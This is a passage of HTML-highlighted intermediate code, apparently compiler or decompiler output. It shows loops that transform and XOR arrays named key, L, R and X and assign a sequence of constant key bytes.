:= var17&lt;+<span class="number">72</span>&gt; ^ var19&lt;+<span class="number">88</span>&gt;</span><br><span class="line">  var21&lt;+<span class="number">104</span>&gt; := temp264</span><br><span class="line">#!tempa := {#<span class="number">8</span>}*{var15&lt;+<span class="number">56</span>&gt;}</span><br><span class="line">  var23(@<span class="built_in">exp</span>.key[<span class="number">0</span>])&lt;+<span class="number">8</span>&gt;&lt;+<span class="number">872</span>&gt;&lt;+tempa&gt; := var21&lt;+<span class="number">104</span>&gt;</span><br><span class="line">  temp262 := #<span class="number">1</span></span><br><span class="line">  var15&lt;+<span class="number">56</span>&gt; := var15&lt;+<span class="number">56</span>&gt; + temp262</span><br><span class="line">  GOTO label168</span><br><span class="line">LABEL label166 :</span><br><span class="line">  temp265 := #<span class="number">0</span></span><br><span class="line">  var15&lt;+<span class="number">56</span>&gt; := temp265</span><br><span class="line">LABEL label176 :</span><br><span class="line">  temp267 := #<span class="number">8</span></span><br><span class="line">  IF var15&lt;+<span class="number">56</span>&gt; &lt; temp267 GOTO label175</span><br><span class="line">  GOTO label174</span><br><span class="line">LABEL label175 :</span><br><span class="line">  temp268 := var15&lt;+<span class="number">56</span>&gt; + var15&lt;+<span class="number">56</span>&gt;</span><br><span class="line">  temp269 := temp268 + var15&lt;+<span class="number">56</span>&gt;</span><br><span class="line">  var16&lt;+<span class="number">64</span>&gt; := temp269</span><br><span class="line">#!tempa := {#<span class="number">8</span>}*{var16&lt;+<span class="number">64</span>&gt;}</span><br><span class="line">  var17&lt;+<span class="number">72</span>&gt; := var22(@<span class="built_in">exp</span>.key[<span class="number">0</span>])&lt;+<span class="number">8</span>&gt;&lt;+<span class="number">488</span>&gt;&lt;+tempa&gt;</span><br><span class="line">#!tempa := {#<span class="number">8</span>}*{var15&lt;+<span class="number">56</span>&gt;}</span><br><span class="line">  var23(@<span class="built_in">exp</span>.X[<span class="number">0</span>])&lt;+<span class="number">328</span>&gt;&lt;+<span class="number">872</span>&gt;&lt;+tempa&gt; := var17&lt;+<span class="number">72</span>&gt;</span><br><span class="line">  temp266 := #<span class="number">1</span></span><br><span class="line">  var15&lt;+<span class="number">56</span>&gt; := var15&lt;+<span class="number">56</span>&gt; + temp266</span><br><span class="line">  GOTO label176</span><br><span class="line">LABEL label174 :</span><br><span class="line">  temp270 := #<span class="number">23</span></span><br><span class="line">  var15&lt;+<span class="number">56</span>&gt; := temp270</span><br><span class="line">LABEL label181 :</span><br><span class="line">  temp272 := #<span class="number">0</span></span><br><span class="line">  IF var15&lt;+<span class="number">56</span>&gt; &gt; temp272 GOTO label180</span><br><span class="line">  GOTO label179</span><br><span class="line">LABEL label180 :</span><br><span class="line">  var18&lt;+<span class="number">80</span>&gt; := var15&lt;+<span class="number">56</span>&gt;</span><br><span class="line">#!tempa := {#<span class="number">8</span>}*{var18&lt;+<span class="number">80</span>&gt;}</span><br><span class="line">  var19&lt;+<span class="number">88</span>&gt; := var23(@<span class="built_in">exp</span>.key[<span class="number">0</span>])&lt;+<span class="number">8</span>&gt;&lt;+<span class="number">872</span>&gt;&lt;+tempa&gt;</span><br><span class="line">  var16&lt;+<span class="number">64</span>&gt; := var15&lt;+<span class="number">56</span>&gt;</span><br><span class="line">  temp273 := #<span class="number">1</span></span><br><span class="line">  var16&lt;+<span class="number">64</span>&gt; := var16&lt;+<span class="number">64</span>&gt; - temp273</span><br><span class="line">#!tempa := {#<span class="number">8</span>}*{var16&lt;+<span class="number">64</span>&gt;}</span><br><span class="line">  var17&lt;+<span class="number">72</span>&gt; := var23(@<span class="built_in">exp</span>.key[<span class="number">0</span>])&lt;+<span class="number">8</span>&gt;&lt;+<span class="number">872</span>&gt;&lt;+tempa&gt;</span><br><span class="line">  temp275 := var19&lt;+<span class="number">88</span>&gt; - var17&lt;+<span class="number">72</span>&gt;</span><br><span class="line">  var21&lt;+<span class="number">104</span>&gt; := temp275</span><br><span class="line">#!tempa := {#<span class="number">8</span>}*{var15&lt;+<span class="number">56</span>&gt;}</span><br><span class="line">  var23(@<span class="built_in">exp</span>.key[<span class="number">0</span>])&lt;+<span class="number">8</span>&gt;&lt;+<span class="number">872</span>&gt;&lt;+tempa&gt; := var21&lt;+<span class="number">104</span>&gt;</span><br><span class="line">  temp271 := #<span class="number">1</span></span><br><span class="line">  var15&lt;+<span class="number">56</span>&gt; := var15&lt;+<span class="number">56</span>&gt; - temp271</span><br><span class="line">  GOTO label181</span><br><span class="line">LABEL label179 :</span><br><span class="line">  temp276 := #<span class="number">0</span></span><br><span class="line">  var15&lt;+<span class="number">56</span>&gt; := temp276</span><br><span class="line">LABEL label190 :</span><br><span class="line">  temp278 := #<span class="number">8</span></span><br><span class="line">  IF var15&lt;+<span class="number">56</span>&gt; &lt; temp278 GOTO label189</span><br><span class="line">  GOTO label188</span><br><span class="line">LABEL label189 :</span><br><span class="line">#!tempa := {#<span class="number">8</span>}*{var15&lt;+<span class="number">56</span>&gt;}</span><br><span class="line">  var16&lt;+<span class="number">64</span>&gt; := var22(@<span class="built_in">exp</span>.L[<span class="number">0</span>])&lt;+<span class="number">200</span>&gt;&lt;+<span class="number">488</span>&gt;&lt;+tempa&gt;</span><br><span class="line">#!tempa := {#<span class="number">8</span>}*{var15&lt;+<span class="number">56</span>&gt;}</span><br><span class="line">  var18&lt;+<span class="number">80</span>&gt; := var22(@<span class="built_in">exp</span>.R[<span class="number">0</span>])&lt;+<span class="number">264</span>&gt;&lt;+<span class="number">488</span>&gt;&lt;+tempa&gt;</span><br><span class="line">#!tempa := {#<span class="number">8</span>}*{var15&lt;+<span class="number">56</span>&gt;}</span><br><span class="line">  var20&lt;+<span class="number">96</span>&gt; := var23(@<span class="built_in">exp</span>.X[<span class="number">0</span>])&lt;+<span class="number">328</span>&gt;&lt;+<span class="number">872</span>&gt;&lt;+tempa&gt;</span><br><span class="line">#!tempa := {#<span class="number">8</span>}*{var16&lt;+<span class="number">64</span>&gt;}</span><br><span class="line">  var17&lt;+<span class="number">72</span>&gt; := var23(@<span class="built_in">exp</span>.key[<span class="number">0</span>])&lt;+<span class="number">8</span>&gt;&lt;+<span class="number">872</span>&gt;&lt;+tempa&gt;</span><br><span class="line">#!tempa := {#<span class="number">8</span>}*{var18&lt;+<span class="number">80</span>&gt;}</span><br><span class="line">  var19&lt;+<span class="number">88</span>&gt; := var23(@<span class="built_in">exp</span>.key[<span class="number">0</span>])&lt;+<span class="number">8</span>&gt;&lt;+<span class="number">872</span>&gt;&lt;+tempa&gt;</span><br><span class="line">  var17&lt;+<span class="number">72</span>&gt; := var17&lt;+<span class="number">72</span>&gt; - var20&lt;+<span class="number">96</span>&gt;</span><br><span class="line">  var19&lt;+<span class="number">88</span>&gt; := var19&lt;+<span class="number">88</span>&gt; + var20&lt;+<span class="number">96</span>&gt;</span><br><span class="line">#!tempa := {#<span class="number">8</span>}*{var16&lt;+<span class="number">64</span>&gt;}</span><br><span class="line">  var23(@<span class="built_in">exp</span>.key[<span class="number">0</span>])&lt;+<span class="number">8</span>&gt;&lt;+<span class="number">872</span>&gt;&lt;+tempa&gt; := var17&lt;+<span class="number">72</span>&gt;</span><br><span class="line">#!tempa := {#<span class="number">8</span>}*{var18&lt;+<span class="number">80</span>&gt;}</span><br><span class="line">  var23(@<span class="built_in">exp</span>.key[<span class="number">0</span>])&lt;+<span class="number">8</span>&gt;&lt;+<span class="number">872</span>&gt;&lt;+tempa&gt; := var19&lt;+<span class="number">88</span>&gt;</span><br><span class="line">  temp277 := #<span class="number">1</span></span><br><span class="line">  var15&lt;+<span class="number">56</span>&gt; := var15&lt;+<span class="number">56</span>&gt; + temp277</span><br><span class="line">  GOTO label190</span><br><span class="line">LABEL label188 :</span><br><span class="line">  temp281 := #<span class="number">1</span></span><br><span class="line">  var15&lt;+<span class="number">56</span>&gt; := temp281</span><br><span class="line">LABEL label201 :</span><br><span class="line">  temp283 := #<span class="number">24</span></span><br><span class="line">  IF var15&lt;+<span class="number">56</span>&gt; &lt; temp283 GOTO label200</span><br><span class="line">  GOTO label199</span><br><span class="line">LABEL label200 :</span><br><span class="line">#!tempa := {#<span class="number">8</span>}*{var15&lt;+<span class="number">56</span>&gt;}</span><br><span class="line">  var17&lt;+<span class="number">72</span>&gt; := var23(@<span class="built_in">exp</span>.key[<span class="number">0</span>])&lt;+<span class="number">8</span>&gt;&lt;+<span class="number">872</span>&gt;&lt;+tempa&gt;</span><br><span class="line">  temp284 := #<span class="number">1</span></span><br><span class="line">  temp285 := var15&lt;+<span class="number">56</span>&gt; - temp284</span><br><span class="line">  var16&lt;+<span class="number">64</span>&gt; := temp285</span><br><span class="line">#!tempa := {#<span class="number">8</span>}*{var16&lt;+<span class="number">64</span>&gt;}</span><br><span class="line">  var20&lt;+<span class="number">96</span>&gt; := var23(@<span class="built_in">exp</span>.key[<span class="number">0</span>])&lt;+<span class="number">8</span>&gt;&lt;+<span class="number">872</span>&gt;&lt;+tempa&gt;</span><br><span class="line">  var17&lt;+<span class="number">72</span>&gt; := var17&lt;+<span class="number">72</span>&gt; + var20&lt;+<span class="number">96</span>&gt;</span><br><span class="line">#!tempa := {#<span class="number">8</span>}*{var15&lt;+<span class="number">56</span>&gt;}</span><br><span class="line">  var23(@<span class="built_in">exp</span>.key[<span class="number">0</span>])&lt;+<span class="number">8</span>&gt;&lt;+<span class="number">872</span>&gt;&lt;+tempa&gt; := var17&lt;+<span class="number">72</span>&gt;</span><br><span class="line">  temp282 := #<span class="number">1</span></span><br><span class="line">  var15&lt;+<span class="number">56</span>&gt; := var15&lt;+<span class="number">56</span>&gt; + temp282</span><br><span class="line">  GOTO label201</span><br><span class="line">LABEL label199 :</span><br><span class="line">  temp287 := #<span class="number">0</span></span><br><span class="line">  var15&lt;+<span class="number">56</span>&gt; := temp287</span><br><span class="line">LABEL label208 :</span><br><span class="line">  temp289 := #<span class="number">7</span></span><br><span class="line">  IF var15&lt;+<span class="number">56</span>&gt; &lt; temp289 GOTO label207</span><br><span class="line">  GOTO label206</span><br><span class="line">LABEL label207 :</span><br><span class="line">  var16&lt;+<span class="number">64</span>&gt; := var15&lt;+<span class="number">56</span>&gt;</span><br><span class="line">#!tempa := {#<span class="number">8</span>}*{var16&lt;+<span class="number">64</span>&gt;}</span><br><span class="line">  var17&lt;+<span class="number">72</span>&gt; := var22(@<span class="built_in">exp</span>.L[<span class="number">0</span>])&lt;+<span class="number">200</span>&gt;&lt;+<span class="number">488</span>&gt;&lt;+tempa&gt;</span><br><span class="line">  temp290 := #<span class="number">1</span></span><br><span class="line">  temp291 := var15&lt;+<span class="number">56</span>&gt; + temp290</span><br><span class="line">  var18&lt;+<span class="number">80</span>&gt; := temp291</span><br><span class="line">#!tempa := {#<span class="number">8</span>}*{var18&lt;+<span class="number">80</span>&gt;}</span><br><span class="line">  var19&lt;+<span class="number">88</span>&gt; := var22(@<span class="built_in">exp</span>.L[<span class="number">0</span>])&lt;+<span class="number">200</span>&gt;&lt;+<span class="number">488</span>&gt;&lt;+tempa&gt;</span><br><span class="line">  temp292 := var17&lt;+<span class="number">72</span>&gt; ^ var19&lt;+<span class="number">88</span>&gt;</span><br><span class="line">  var21&lt;+<span class="number">104</span>&gt; := temp292</span><br><span class="line">  temp293 := #<span class="number">23</span></span><br><span class="line">  IF var21&lt;+<span class="number">104</span>&gt; &gt; temp293 GOTO label215</span><br><span class="line">  GOTO label214</span><br><span class="line">LABEL label215 :</span><br><span class="line">  temp294 := #<span class="number">23</span></span><br><span class="line">  var21&lt;+<span class="number">104</span>&gt; := temp294</span><br><span class="line">LABEL label214 :</span><br><span class="line">#!tempa := {#<span class="number">8</span>}*{var15&lt;+<span class="number">56</span>&gt;}</span><br><span class="line">  var25(@<span class="built_in">exp</span>.L[<span class="number">0</span>])&lt;+<span class="number">200</span>&gt;&lt;+<span class="number">1640</span>&gt;&lt;+tempa&gt; := var21&lt;+<span class="number">104</span>&gt;</span><br><span class="line">  temp288 := #<span class="number">1</span></span><br><span class="line">  var15&lt;+<span class="number">56</span>&gt; := var15&lt;+<span class="number">56</span>&gt; + temp288</span><br><span class="line">  GOTO label208</span><br><span class="line">LABEL label206 :</span><br><span class="line">  temp296 := #<span class="number">0</span></span><br><span class="line">  var25(@<span class="built_in">exp</span>.L[<span class="number">7</span>])&lt;+<span class="number">256</span>&gt;&lt;+<span class="number">1640</span>&gt; := temp296</span><br><span class="line">  temp297 := #<span class="number">0</span></span><br><span class="line">  var15&lt;+<span class="number">56</span>&gt; := temp297</span><br><span class="line">LABEL label219 :</span><br><span class="line">  temp299 := #<span class="number">7</span></span><br><span class="line">  IF var15&lt;+<span class="number">56</span>&gt; &lt; temp299 GOTO label218</span><br><span class="line">  GOTO label217</span><br><span class="line">LABEL label218 :</span><br><span class="line">  var16&lt;+<span class="number">64</span>&gt; := var15&lt;+<span class="number">56</span>&gt;</span><br><span class="line">#!tempa := {#<span class="number">8</span>}*{var16&lt;+<span class="number">64</span>&gt;}</span><br><span class="line">  var17&lt;+<span class="number">72</span>&gt; := var22(@<span class="built_in">exp</span>.R[<span class="number">0</span>])&lt;+<span class="number">264</span>&gt;&lt;+<span class="number">488</span>&gt;&lt;+tempa&gt;</span><br><span class="line">  temp300 := #<span class="number">1</span></span><br><span class="line">  temp301 := var15&lt;+<span class="number">56</span>&gt; + temp300</span><br><span class="line">  var18&lt;+<span class="number">80</span>&gt; := temp301</span><br><span class="line">#!tempa := {#<span class="number">8</span>}*{var18&lt;+<span class="number">80</span>&gt;}</span><br><span class="line">  var19&lt;+<span class="number">88</span>&gt; := var22(@<span class="built_in">exp</span>.R[<span class="number">0</span>])&lt;+<span class="number">264</span>&gt;&lt;+<span class="number">488</span>&gt;&lt;+tempa&gt;</span><br><span class="line">  temp302 := var17&lt;+<span class="number">72</span>&gt; ^ var19&lt;+<span class="number">88</span>&gt;</span><br><span class="line">  var21&lt;+<span class="number">104</span>&gt; := temp302</span><br><span class="line">  temp303 := #<span class="number">23</span></span><br><span class="line">  IF var21&lt;+<span class="number">104</span>&gt; &gt; temp303 GOTO label226</span><br><span class="line">  GOTO label225</span><br><span class="line">LABEL label226 :</span><br><span class="line">  temp304 := #<span class="number">23</span></span><br><span class="line">  var21&lt;+<span class="number">104</span>&gt; := temp304</span><br><span class="line">LABEL label225 :</span><br><span class="line">#!tempa := {#<span class="number">8</span>}*{var15&lt;+<span class="number">56</span>&gt;}</span><br><span class="line">  var25(@<span class="built_in">exp</span>.R[<span class="number">0</span>])&lt;+<span class="number">264</span>&gt;&lt;+<span class="number">1640</span>&gt;&lt;+tempa&gt; := var21&lt;+<span class="number">104</span>&gt;</span><br><span class="line">  temp298 := #<span class="number">1</span></span><br><span class="line">  var15&lt;+<span class="number">56</span>&gt; := var15&lt;+<span class="number">56</span>&gt; + temp298</span><br><span class="line">  GOTO label219</span><br><span class="line">LABEL label217 :</span><br><span class="line">  temp306 := #<span class="number">23</span></span><br><span class="line">  var25(@<span class="built_in">exp</span>.R[<span class="number">7</span>])&lt;+<span class="number">320</span>&gt;&lt;+<span class="number">1640</span>&gt; := temp306</span><br><span class="line">  temp307 := #<span class="number">0</span></span><br><span class="line">  var15&lt;+<span class="number">56</span>&gt; := temp307</span><br><span class="line">LABEL label230 :</span><br><span class="line">  temp309 := #<span class="number">7</span></span><br><span class="line">  IF var15&lt;+<span class="number">56</span>&gt; &lt; temp309 GOTO label229</span><br><span class="line">  GOTO label228</span><br><span class="line">LABEL label229 :</span><br><span class="line">  var16&lt;+<span class="number">64</span>&gt; := var15&lt;+<span class="number">56</span>&gt;</span><br><span class="line">#!tempa := {#<span class="number">8</span>}*{var16&lt;+<span class="number">64</span>&gt;}</span><br><span class="line">  var17&lt;+<span class="number">72</span>&gt; := var22(@<span class="built_in">exp</span>.X[<span class="number">0</span>])&lt;+<span class="number">328</span>&gt;&lt;+<span class="number">488</span>&gt;&lt;+tempa&gt;</span><br><span class="line">  temp310 := #<span class="number">1</span></span><br><span class="line">  temp311 := var15&lt;+<span class="number">56</span>&gt; + temp310</span><br><span class="line">  var18&lt;+<span class="number">80</span>&gt; := temp311</span><br><span class="line">#!tempa := {#<span class="number">8</span>}*{var18&lt;+<span class="number">80</span>&gt;}</span><br><span class="line">  var19&lt;+<span class="number">88</span>&gt; := var22(@<span class="built_in">exp</span>.X[<span class="number">0</span>])&lt;+<span class="number">328</span>&gt;&lt;+<span class="number">488</span>&gt;&lt;+tempa&gt;</span><br><span class="line">  temp312 := var17&lt;+<span class="number">72</span>&gt; ^ var19&lt;+<span class="number">88</span>&gt;</span><br><span class="line">  var21&lt;+<span class="number">104</span>&gt; := temp312</span><br><span class="line">#!tempa := {#<span class="number">8</span>}*{var15&lt;+<span class="number">56</span>&gt;}</span><br><span class="line">  var25(@<span class="built_in">exp</span>.X[<span class="number">0</span>])&lt;+<span class="number">328</span>&gt;&lt;+<span class="number">1640</span>&gt;&lt;+tempa&gt; := var21&lt;+<span class="number">104</span>&gt;</span><br><span class="line">  temp308 := #<span class="number">1</span></span><br><span class="line">  var15&lt;+<span class="number">56</span>&gt; := var15&lt;+<span class="number">56</span>&gt; + temp308</span><br><span class="line">  GOTO label230</span><br><span class="line">LABEL label228 :</span><br><span class="line">  temp314 := #<span class="number">12</span></span><br><span class="line">  var25(@<span class="built_in">exp</span>.X[<span class="number">7</span>])&lt;+<span class="number">384</span>&gt;&lt;+<span class="number">1640</span>&gt; := temp314</span><br><span class="line">  temp316 := #<span class="number">127</span></span><br><span class="line">  var25(@<span class="built_in">exp</span>.key[<span class="number">0</span>])&lt;+<span class="number">8</span>&gt;&lt;+<span class="number">1640</span>&gt; := temp316</span><br><span class="line">  temp318 := #<span class="number">111</span></span><br><span class="line">  var25(@<span class="built_in">exp</span>.key[<span class="number">1</span>])&lt;+<span class="number">16</span>&gt;&lt;+<span class="number">1640</span>&gt; := temp318</span><br><span class="line">  temp320 := #<span class="number">188</span></span><br><span class="line">  var25(@<span class="built_in">exp</span>.key[<span class="number">2</span>])&lt;+<span class="number">24</span>&gt;&lt;+<span class="number">1640</span>&gt; := temp320</span><br><span class="line">  temp322 := #<span class="number">174</span></span><br><span class="line">  var25(@<span class="built_in">exp</span>.key[<span class="number">3</span>])&lt;+<span class="number">32</span>&gt;&lt;+<span class="number">1640</span>&gt; := temp322</span><br><span class="line">  temp324 := #<span class="number">195</span></span><br><span class="line">  var25(@<span class="built_in">exp</span>.key[<span class="number">4</span>])&lt;+<span class="number">40</span>&gt;&lt;+<span class="number">1640</span>&gt; := temp324</span><br><span class="line">  temp326 := #<span class="number">128</span></span><br><span class="line">  var25(@<span class="built_in">exp</span>.key[<span class="number">5</span>])&lt;+<span class="number">48</span>&gt;&lt;+<span class="number">1640</span>&gt; := temp326</span><br><span class="line">  temp328 := #<span class="number">88</span></span><br><span class="line">  var25(@<span class="built_in">exp</span>.key[<span class="number">6</span>])&lt;+<span class="number">56</span>&gt;&lt;+<span class="number">1640</span>&gt; := temp328</span><br><span class="line">  temp330 := #<span class="number">121</span></span><br><span class="line">  var25(@<span class="built_in">exp</span>.key[<span class="number">7</span>])&lt;+<span class="number">64</span>&gt;&lt;+<span class="number">1640</span>&gt; := temp330</span><br><span class="line">  temp332 := #<span class="number">123</span></span><br><span class="line">  var25(@<span class="built_in">exp</span>.key[<span class="number">8</span>])&lt;+<span class="number">72</span>&gt;&lt;+<span class="number">1640</span>&gt; := temp332</span><br><span class="line">  temp334 := #<span class="number">103</span></span><br><span class="line">  var25(@<span class="built_in">exp</span>.key[<span class="number">9</span>])&lt;+<span class="number">80</span>&gt;&lt;+<span class="number">1640</span>&gt; := temp334</span><br><span class="line">  temp336 := #<span class="number">57</span></span><br><span class="line">  var25(@<span class="built_in">exp</span>.key[<span class="number">10</span>])&lt;+<span class="number">88</span>&gt;&lt;+<span class="number">1640</span>&gt; := temp336</span><br><span class="line">  temp338 := #<span class="number">123</span></span><br><span class="line">  var25(@<span class="built_in">exp</span>.key[<span class="number">11</span>])&lt;+<span class="number">96</span>&gt;&lt;+<span class="number">1640</span>&gt; := temp338</span><br><span class="line">  temp340 := #<span class="number">97</span></span><br><span class="line">  var25(@<span class="built_in">exp</span>.key[<span class="number">12</span>])&lt;+<span class="number">104</span>&gt;&lt;+<span class="number">1640</span>&gt; := temp340</span><br><span class="line">  temp342 := #<span class="number">74</span></span><br><span class="line">  var25(@<span class="built_in">exp</span>.key[<span class="number">13</span>])&lt;+<span class="number">112</span>&gt;&lt;+<span class="number">1640</span>&gt; := temp342</span><br><span class="line">  temp344 := #<span class="number">37</span></span><br><span class="line">  var25(@<span class="built_in">exp</span>.key[<span class="number">14</span>])&lt;+<span class="number">120</span>&gt;&lt;+<span class="number">1640</span>&gt; := temp344</span><br><span class="line">  temp346 := #<span class="number">59</span></span><br><span class="line">  var25(@<span class="built_in">exp</span>.key[<span class="number">15</span>])&lt;+<span class="number">128</span>&gt;&lt;+<span class="number">1640</span>&gt; := temp346</span><br><span class="line">  temp348 := #<span class="number">21</span></span><br><span class="line">  var25(@<span class="built_in">exp</span>.key[<span class="number">16</span>])&lt;+<span class="number">136</span>&gt;&lt;+<span class="number">1640</span>&gt; := temp348</span><br><span class="line">  temp350 := #<span class="number">47</span></span><br><span class="line">  var25(@<span class="built_in">exp</span>.key[<span class="number">17</span>])&lt;+<span class="number">144</span>&gt;&lt;+<span class="number">1640</span>&gt; := temp350</span><br><span class="line">  temp352 := #<span class="number">54</span></span><br><span class="line">  var25(@<span class="built_in">exp</span>.key[<span class="number">18</span>])&lt;+<span class="number">152</span>&gt;&lt;+<span class="number">1640</span>&gt; := temp352</span><br><span class="line">  temp354 := #<span class="number">28</span></span><br><span class="line">  var25(@<span class="built_in">exp</span>.key[<span class="number">19</span>])&lt;+<span class="number">160</span>&gt;&lt;+<span class="number">1640</span>&gt; := temp354</span><br><span class="line">  temp356 := #<span class="number">49</span></span><br><span class="line">  var25(@<span class="built_in">exp</span>.key[<span class="number">20</span>])&lt;+<span class="number">168</span>&gt;&lt;+<span class="number">1640</span>&gt; := temp356</span><br><span class="line">  temp358 := #<span class="number">55</span></span><br><span class="line">  var25(@<span class="built_in">exp</span>.key[<span class="number">21</span>])&lt;+<span class="number">176</span>&gt;&lt;+<span class="number">1640</span>&gt; := temp358</span><br><span class="line">  var25(@<span class="built_in">exp</span>.key[<span class="number">22</span>])&lt;+<span class="number">184</span>&gt;&lt;+<span class="number">1640</span>&gt; := var1&lt;+<span class="number">8</span>&gt;</span><br><span class="line">  temp361 := #<span class="number">125</span></span><br><span class="line">  var25(@<span class="built_in">exp</span>.key[<span class="number">23</span>])&lt;+<span class="number">192</span>&gt;&lt;+<span class="number">1640</span>&gt; := temp361</span><br><span class="line">  temp362 := #<span class="number">23</span></span><br><span class="line">  var15&lt;+<span class="number">56</span>&gt; := temp362</span><br><span class="line">LABEL label263 :</span><br><span class="line">  temp364 := #<span class="number">0</span></span><br><span class="line">  IF var15&lt;+<span class="number">56</span>&gt; &gt; temp364 GOTO label262</span><br><span class="line">  GOTO label261</span><br><span class="line">LABEL label262 :</span><br><span class="line">  var18&lt;+<span class="number">80</span>&gt; := var15&lt;+<span class="number">56</span>&gt;</span><br><span class="line">#!tempa := {#<span class="number">8</span>}*{var18&lt;+<span class="number">80</span>&gt;}</span><br><span class="line">  var19&lt;+<span class="number">88</span>&gt; := var25(@<span class="built_in">exp</span>.key[<span class="number">0</span>])&lt;+<span class="number">8</span>&gt;&lt;+<span class="number">1640</span>&gt;&lt;+tempa&gt;</span><br><span class="line">  var16&lt;+<span class="number">64</span>&gt; := var15&lt;+<span class="number">56</span>&gt;</span><br><span class="line">  temp365 := #<span class="number">1</span></span><br><span class="line">  var16&lt;+<span class="number">64</span>&gt; := var16&lt;+<span class="number">64</span>&gt; - temp365</span><br><span class="line">#!tempa := {#<span class="number">8</span>}*{var16&lt;+<span class="number">64</span>&gt;}</span><br><span class="line">  var17&lt;+<span class="number">72</span>&gt; := var25(@<span class="built_in">exp</span>.key[<span class="number">0</span>])&lt;+<span class="number">8</span>&gt;&lt;+<span class="number">1640</span>&gt;&lt;+tempa&gt;</span><br><span class="line">  temp367 := var19&lt;+<span class="number">88</span>&gt; - var17&lt;+<span class="number">72</span>&gt;</span><br><span class="line">  var21&lt;+<span class="number">104</span>&gt; := temp367</span><br><span class="line">#!tempa := {#<span class="number">8</span>}*{var15&lt;+<span class="number">56</span>&gt;}</span><br><span class="line">  var25(@<span class="built_in">exp</span>.key[<span class="number">0</span>])&lt;+<span class="number">8</span>&gt;&lt;+<span class="number">1640</span>&gt;&lt;+tempa&gt; := var21&lt;+<span class="number">104</span>&gt;</span><br><span class="line">  temp363 := #<span class="number">1</span></span><br><span class="line">  var15&lt;+<span class="number">56</span>&gt; := var15&lt;+<span class="number">56</span>&gt; - temp363</span><br><span class="line">  GOTO label263</span><br><span class="line">LABEL label261 :</span><br><span class="line">  temp368 := #<span class="number">0</span></span><br><span class="line">  var15&lt;+<span class="number">56</span>&gt; := temp368</span><br><span class="line">LABEL label272 :</span><br><span class="line">  temp370 := #<span class="number">8</span></span><br><span class="line">  IF var15&lt;+<span class="number">56</span>&gt; &lt; temp370 GOTO label271</span><br><span class="line">  GOTO label270</span><br><span class="line">LABEL label271 :</span><br><span class="line">#!tempa := {#<span class="number">8</span>}*{var15&lt;+<span class="number">56</span>&gt;}</span><br><span class="line">  var16&lt;+<span class="number">64</span>&gt; := var25(@<span class="built_in">exp</span>.L[<span class="number">0</span>])&lt;+<span class="number">200</span>&gt;&lt;+<span class="number">1640</span>&gt;&lt;+tempa&gt;</span><br><span class="line">#!tempa := {#<span class="number">8</span>}*{var15&lt;+<span class="number">56</span>&gt;}</span><br><span class="line">  var18&lt;+<span class="number">80</span>&gt; := var25(@<span class="built_in">exp</span>.R[<span class="number">0</span>])&lt;+<span class="number">264</span>&gt;&lt;+<span class="number">1640</span>&gt;&lt;+tempa&gt;</span><br><span class="line">#!tempa := {#<span class="number">8</span>}*{var15&lt;+<span class="number">56</span>&gt;}</span><br><span class="line">  var20&lt;+<span class="number">96</span>&gt; := var25(@<span class="built_in">exp</span>.X[<span class="number">0</span>])&lt;+<span class="number">328</span>&gt;&lt;+<span class="number">1640</span>&gt;&lt;+tempa&gt;</span><br><span class="line">#!tempa := {#<span class="number">8</span>}*{var16&lt;+<span class="number">64</span>&gt;}</span><br><span class="line">  var17&lt;+<span class="number">72</span>&gt; := var25(@<span class="built_in">exp</span>.key[<span class="number">0</span>])&lt;+<span class="number">8</span>&gt;&lt;+<span class="number">1640</span>&gt;&lt;+tempa&gt;</span><br><span class="line">#!tempa := {#<span class="number">8</span>}*{var18&lt;+<span class="number">80</span>&gt;}</span><br><span class="line">  var19&lt;+<span class="number">88</span>&gt; := var25(@<span class="built_in">exp</span>.key[<span class="number">0</span>])&lt;+<span class="number">8</span>&gt;&lt;+<span class="number">1640</span>&gt;&lt;+tempa&gt;</span><br><span class="line">  var17&lt;+<span class="number">72</span>&gt; := var17&lt;+<span class="number">72</span>&gt; - var20&lt;+<span class="number">96</span>&gt;</span><br><span class="line">  var19&lt;+<span class="number">88</span>&gt; := var19&lt;+<span class="number">88</span>&gt; + var20&lt;+<span class="number">96</span>&gt;</span><br><span class="line">#!tempa := {#<span class="number">8</span>}*{var16&lt;+<span class="number">64</span>&gt;}</span><br><span class="line">  var25(@<span class="built_in">exp</span>.key[<span class="number">0</span>])&lt;+<span class="number">8</span>&gt;&lt;+<span class="number">1640</span>&gt;&lt;+tempa&gt; := var17&lt;+<span class="number">72</span>&gt;</span><br><span class="line">#!tempa := {#<span class="number">8</span>}*{var18&lt;+<span class="number">80</span>&gt;}</span><br><span class="line">  var25(@<span class="built_in">exp</span>.key[<span class="number">0</span>])&lt;+<span class="number">8</span>&gt;&lt;+<span class="number">1640</span>&gt;&lt;+tempa&gt; := var19&lt;+<span class="number">88</span>&gt;</span><br><span class="line">  temp369 := #<span class="number">1</span></span><br><span class="line">  var15&lt;+<span class="number">56</span>&gt; := var15&lt;+<span class="number">56</span>&gt; + temp369</span><br><span class="line">  GOTO label272</span><br><span class="line">LABEL label270 :</span><br><span class="line">  temp373 := #<span class="number">1</span></span><br><span class="line">  var15&lt;+<span class="number">56</span>&gt; := temp373</span><br><span class="line">LABEL label283 :</span><br><span class="line">  temp375 := #<span class="number">24</span></span><br><span class="line">  IF var15&lt;+<span class="number">56</span>&gt; &lt; temp375 GOTO label282</span><br><span class="line">  GOTO label281</span><br><span class="line">LABEL label282 :</span><br><span class="line">#!tempa := {#<span class="number">8</span>}*{var15&lt;+<span class="number">56</span>&gt;}</span><br><span class="line">  var17&lt;+<span class="number">72</span>&gt; := var25(@<span class="built_in">exp</span>.key[<span class="number">0</span>])&lt;+<span class="number">8</span>&gt;&lt;+<span class="number">1640</span>&gt;&lt;+tempa&gt;</span><br><span class="line">  temp376 := #<span class="number">1</span></span><br><span class="line">  temp377 := var15&lt;+<span class="number">56</span>&gt; - temp376</span><br><span class="line">  var16&lt;+<span class="number">64</span>&gt; := temp377</span><br><span class="line">#!tempa := {#<span class="number">8</span>}*{var16&lt;+<span class="number">64</span>&gt;}</span><br><span class="line">  var20&lt;+<span class="number">96</span>&gt; := var25(@<span class="built_in">exp</span>.key[<span class="number">0</span>])&lt;+<span class="number">8</span>&gt;&lt;+<span class="number">1640</span>&gt;&lt;+tempa&gt;</span><br><span class="line">  var17&lt;+<span class="number">72</span>&gt; := var17&lt;+<span class="number">72</span>&gt; + var20&lt;+<span class="number">96</span>&gt;</span><br><span class="line">#!tempa := {#<span class="number">8</span>}*{var15&lt;+<span class="number">56</span>&gt;}</span><br><span class="line">  var25(@<span class="built_in">exp</span>.key[<span class="number">0</span>])&lt;+<span class="number">8</span>&gt;&lt;+<span 